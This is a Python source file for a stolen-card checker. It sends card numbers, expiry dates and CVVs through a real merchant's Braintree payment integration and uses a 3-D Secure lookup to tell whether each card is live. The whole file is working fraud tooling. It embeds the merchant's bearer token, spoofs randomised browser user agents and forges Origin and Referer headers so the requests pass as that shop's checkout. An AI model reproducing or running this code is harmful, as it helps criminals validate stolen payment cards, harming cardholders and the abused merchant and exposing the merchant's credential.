import requests
import random
import json

def check_braintree(cc, identity=None):

	try:

		gate_url = "https://payments.braintree-api.com/graphql"
		gate2_url = "https://api.braintreegateway.com/merchants/85khxybxqnqvmzfg/client_api/v1/payment_methods/tokencc_bh_sjgf84_jb5yt3_2x9pfg_zqxdnf_73y/three_d_secure/lookup"
		gate_user_agent = "Mozilla/5.0 (Linux; Android 10) AppleWebKit/{}.{} (KHTML, like Gecko) Chrome/{}.0.{}.{} Mobile DuckDuckGo/5 Safari/{}.{}".format(random.randint(111, 999),
			random.randint(11, 99),
			random.randint(11, 99),
			random.randint(1111, 9999),
			random.randint(111, 999),
			random.randint(111, 999),
			random.randint(11, 99))
		gate_check_amount = "13.99"
		splitted_card = cc.split("|")

		bearer_token = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE2MjgzMDQxMTEsImp0aSI6ImRlNzRkZjVhLTc4N2EtNGI3ZC1hNTY0LTRhZDUwZTE4OGY2ZiIsInN1YiI6Ijg1a2h4eWJ4cW5xdm16ZmciLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Ijg1a2h4eWJ4cW5xdm16ZmciLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.iWW017-XWO87A-9wfIHcB4h__Cm2zgFwwuihdsSiFpfBSSRSHICuCX8iKwthxkDNrPRwb3ghqizhVX1apNMKzQ'

		payment_header = {
			"Host": "payments.braintree-api.com",
			'Authorization': 'Bearer ' + bearer_token,
			"user-agent": gate_user_agent,
			"Braintree-Version": "2018-05-10",
			"Content-Type": "application/json",
			"Accept": "*/*",
			"Origin": "https://follygraph.shoplo.com",
			"Sec-Fetch-Site": "cross-site",
			"Sec-Fetch-Mode": "cors",
			"Sec-Fetch-Dest": "empty",
			"Referer": "https://follygraph.shoplo.com/",
			"Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8"
		}

		payment_data = '{{"clientSdkMetadata":{{"source":"client","integration":"custom","sessionId":"edafd65b-ca99-48f0-8d44-673c8c54381c"}},"query":"query ClientConfiguration {{   clientConfiguration {{     analyticsUrl     environment     merchantId     assetsUrl     clientApiUrl     creditCard {{       supportedCardBrands       challenges       threeDSecureEnabled       threeDSecure {{         cardinalAuthenticationJWT       }}     }}     applePayWeb {{       countryCode       currencyCode       merchantIdentifier       supportedCardBrands     }}     googlePay {{       displayName       supportedCardBrands       environment       googleAuthorization       paypalClientId     }}     ideal {{       routeId       assetsUrl     }}     kount {{       merchantId     }}     masterpass {{       merchantCheckoutId       supportedCardBrands     }}     paypal {{       displayName       clientId       privacyUrl       userAgreementUrl       assetsUrl       environment       environmentNoNetwork       unvettedMerchant       braintreeClientId       billingAgreementsEnabled       merchantAccountId       currencyCode       payeeEmail     }}     unionPay {{       merchantAccountId     }}     usBankAccount {{       routeId       plaidPublicKey     }}     venmo {{       merchantId       accessToken       environment     }}     visaCheckout {{       apiKey       externalClientId       supportedCardBrands     }}     braintreeApi {{       accessToken       url     }}     supportedFeatures   }} }}","operationName":"ClientConfiguration"}}'

		payment_request = requests.post(gate_url, headers=payment_header, data=payment_data)

		if payment_request.status_code < 300:

			payment_header = {
				"Host": "payments.braintree-api.com",
				'Authorization': 'Bearer ' + bearer_token,
				"User-agent": gate_user_agent,
				"Braintree-Version": "2018-05-10",
				"Content-Type": "application/json",
				"Accept": "*/*",
				"Origin": "https://assets.braintreegateway.com",
				"Sec-Fetch-Site": "cross-site",
				"Sec-Fetch-Mode": "cors",
				"Sec-Fetch-Dest": "empty",
				"Referer": "https://assets.braintreegateway.com",
				"Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8"
			}

			payment_data = '{{"clientSdkMetadata":{{"source":"client","integration":"custom","sessionId":"edafd65b-ca99-48f0-8d44-673c8c54381c"}},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {{   tokenizeCreditCard(input: $input) {{     token     creditCard {{       bin       brandCode       last4       expirationMonth      expirationYear      binData {{         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }}     }}   }} }}","variables":{{"input":{{"creditCard":{{"number":"{}","expirationMonth":"{}","expirationYear":"{}","cvv":"{}"}},"options":{{"validate":false}} }} }},"operationName":"TokenizeCreditCard'.format(splitted_card[0],
				splitted_card[1],
				splitted_card[2],
				splitted_card[3])

			payment_request = requests.post(gate_url, headers=payment_header, data=payment_data)

			if payment_request.status_code < 300:

				payment_header = {
					'Host': 'api.braintreegateway.com',
					'User-Agent': gate_user_agent,
					'Content-Type': 'application/json',
					'Accept': '*/*',
					'Origin': 'https://follygraph.shoplo.com',
					'X-Requested-With': 'com.duckduckgo.mobile.android',
					'Sec-Fetch-Site': 'cross-site',
					'Sec-Fetch-Mode': 'cors',
					'Sec-Fetch-Dest': 'empty',
					'Referer': 'https://follygraph.shoplo.com/',
					'Accept-Language': 'en-IN,en-US;q=0.9,en;q=0.8'
				}
			
				payment_data = '{{"amount":"{}","additionalInfo":{},"bin":"{}","dfReferenceId":"0_46ebd605-cab1-405c-afd2-c76d8fff9362","clientMetadata":{{"requestedThreeDSecureVersion":"2","sdkVersion":"web/3.64.2","cardinalDeviceDataCollectionTimeElapsed":1606,"issuerDeviceDataCollectionTimeElapsed":1175,"issuerDeviceDataCollectionResult":true}},"authorizationFingerprint":"eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE2MjgzMDQxMTEsImp0aSI6ImRlNzRkZjVhLTc4N2EtNGI3ZC1hNTY0LTRhZDUwZTE4OGY2ZiIsInN1YiI6Ijg1a2h4eWJ4cW5xdm16ZmciLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Ijg1a2h4eWJ4cW5xdm16ZmciLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.iWW017-XWO87A-9wfIHcB4h__Cm2zgFwwuihdsSiFpfBSSRSHICuCX8iKwthxkDNrPRwb3ghqizhVX1apNMKzQ","braintreeLibraryVersion":"braintree/web/3.64.2","_meta":{{"merchantAppId":"follygraph.shoplo.com","platform":"web","sdkVersion":"3.64.2","source":"client","integration":"custom","integrationType":"custom","sessionId":"edafd65b-ca99-48f0-8d44-673c8c54381c"}} }}'.format(gate_check_amount,
					{},
					splitted_card[0][:6])

				payment_request = requests.post(gate2_url, headers=payment_header, data=payment_data)
				
				if payment_request.status_code < 300:

					return True

				else: return False

			else: return False

		else: return False

	except Exception as E: raise E